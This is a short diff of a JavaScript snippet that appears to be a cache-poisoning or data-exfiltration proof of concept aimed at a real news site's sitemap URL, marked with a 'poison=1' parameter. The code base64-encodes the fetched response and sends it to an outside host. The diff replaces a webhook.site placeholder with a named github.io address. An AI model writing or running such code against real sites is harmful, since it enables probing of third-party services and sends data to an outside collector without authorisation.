@@ -5,5 +5,5 @@ fetch("https://www.bild.de/sitemap-index-200605.xml?poison=1", {
   .then(res => res.text())
   .then(data => {
     // Replace with your server if needed
-    fetch("https://webhook.site/your-endpoint?data=" + btoa(data));
+    fetch("https://mohammed-ishfaq.github.io?data=" + btoa(data));
   });
